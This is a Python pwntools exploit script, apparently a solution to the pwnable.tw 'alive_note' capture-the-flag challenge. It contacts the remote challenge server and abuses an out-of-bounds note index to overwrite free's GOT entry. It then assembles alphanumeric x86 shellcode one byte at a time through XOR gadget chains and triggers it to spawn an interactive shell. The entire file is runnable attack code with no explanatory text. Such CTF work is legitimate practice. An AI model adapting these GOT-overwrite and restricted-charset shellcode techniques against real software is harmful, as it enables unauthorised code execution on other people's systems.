#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = False

c = 0
pwn_file = "./alive_note"
elf = ELF(pwn_file)
if debug:
    c = process(pwn_file)
else:
    c = remote('chall.pwnable.tw', 10300)

context.os='linux'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    c_time = 'c\n' * (1)
    gdbcmd = '''
    # call atoi
    #b *0x8048560

    # call free
    b *0x80484e0
    ''' + c_time

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

def send_menu(command):
    c.recvuntil(':')
    c.send(command)

memory_base_offset = -1107372056-0x8 # Absolute Address: 0x0

def read_mem(address):
    send_menu(b'2')
    send_menu(str(int(memory_base_offset + address / 4)))

def free_mem(address):
    send_menu(b'3')
    send_menu(str(int(memory_base_offset + address / 4)))

def write_mem(address, data):
    send_menu(b'1')
    send_menu(str(int(memory_base_offset + address / 4)))
    send_menu(data)

def free_mem_org(address):
    send_menu(b'3')
    send_menu(str(int(address)))

def write_mem_org(address, data):
    send_menu(b'1')
    send_menu(str(int(address)))
    send_menu(data)

    assert(len(data) == 7 and data[6] == '\0')

# leak heap address
# chunk 0 push eax; leak heap address
ck0 = 'Q' # push 0, ecx is 0
ck0 += 'P' # push eax
ck0 += 'UUXY' # set ecx and eax = ebp
ck0 += '\0'

# chunk 1 shift >> 8 ; inc 2; shift << 8
ck1 = 'D' # inc esp
ck1 += 'ZBBRL' # pop edx ; inc2 edx ; push edx ; dec esp
ck1 += '\0' #

def set_esi_zero():
    ck = 'V' # push esi
    ck += 'TZ' # mov edx, esp
    ck += '32' # xor esi, DWORD PTR [edx]
    ck += 'Z' # pop stack
    ck += '\0'
    write_mem_org(0, ck)

def set_edx_to_heap():
    ck = 'ZR' # pop edx ; push edx
    ck += 'EEEE' # padding
    ck += '\0'
    write_mem_org(0, ck)

def set_esi_byte(byte):
    set_esi_zero()
    ck = 'j' + byte # push byte
    ck += 'TZ' # mov edx, esp
    ck += '32' # xor esi, DWORD PTR [edx]
    ck += '\0'
    write_mem_org(0, ck)

    ck = 'ZBBBBB\0' # pop stack
    write_mem_org(0, ck)

def set_edx_byte(byte):
    ck = 'j' + byte # push byte
    ck += 'Z' # pop edx
    ck += 'BBBB\0' # padding
    write_mem_org(0, ck)


def heap_ptr_inc():
    # pop edx
    # inc edx
    # push edx
    ck = "ZBR"
    ck += 'EEE' # padding
    ck += '\0'
    write_mem_org(0, ck)

def xor_heap_ptr(byte):
    set_esi_byte(byte)

    # make sure assert((*ebx & 0xff) == 0)
    # following code assume (*ebx & 0xff) == 0
    set_edx_to_heap()
    ck = '12' # xor    DWORD PTR [edx], esi
    ck += 'EEEE' # padding
    ck += '\0'
    write_mem_org(0, ck)

def heap_ptr_value_dec():
    set_esi_zero()
    set_edx_to_heap()
    # clear *edx = 0 first
    ck = '32' # xor    esi, DWORD PTR [edx]
    ck += '12' # xor    DWORD PTR [edx], esi
    ck += 'EE' # padding
    ck += '\0'
    write_mem_org(0, ck)

    # inc and store
    ck = 'N' # dec esi
    ck += '12' # xor    DWORD PTR [edx], esi
    ck += 'EEE' # padding
    ck += '\0'
    write_mem_org(0, ck)

def heap_ptr_value_zero():
    set_esi_zero()
    set_edx_to_heap()
    # clear *edx = 0 first
    ck = '32' # xor    esi, DWORD PTR [edx]
    ck += '12' # xor    DWORD PTR [edx], esi
    ck += 'EE' # padding
    ck += '\0'
    write_mem_org(0, ck)

def heap_ptr_value_inc():
    heap_ptr_value_zero() # edx = heap, esi = *heap

    # inc and store
    ck = 'F' # inc esi
    ck += '12' # xor    DWORD PTR [edx], esi
    ck += 'EEE' # padding
    ck += '\0'
    write_mem_org(0, ck)

def last_chunk_jmp():
    ck = 'tz' # je z
    ck += 'uz' # jne z
    ck += 'FF' # padding
    ck += '\0'
    write_mem_org(0, ck)

# now we have an address of shellcode
# write asm jmp2plt
# jmp to read() plt
read_plt = elf.plt['read']
shellcode1 = asm('pop eax; push 0xff ; push eax; push 0x0') # set read(0, heap_addr,0xff)
shellcode1 += asm('mov eax, {}; jmp eax'.format(str(hex(read_plt))))
allow_char = string.digits + string.ascii_letters

# shellcode
write_mem(elf.got['free'], ck0)
write_mem_org(0, ck1)

def find_setting_chain(byte):
    if chr(byte) in allow_char:
        xor_heap_ptr(chr(byte))
    else:
        if byte > 0x7a:
            heap_ptr_value_dec()
            byte ^= 0xff

        for c1 in allow_char:
            if chr(byte ^ ord(c1)) in allow_char:
                xor_heap_ptr(c1)
                xor_heap_ptr(chr(byte ^ ord(c1)))
                return

        raise Exception('not found allow char: ' + str(hex(byte)))
    return

context.log_level = 'info'
shellcode = asm(shellcraft.sh())
count = 0
print(len(shellcode))
for byte in shellcode:
    heap_ptr_value_zero()
    find_setting_chain(byte)
    print(chr(byte))
    count += 1
    print(count / len(shellcode))
    heap_ptr_inc()
print('down')
context.log_level = 'debug'

last_chunk_jmp()

# exec code
free_mem_org(0)

c.interactive()
c.close()

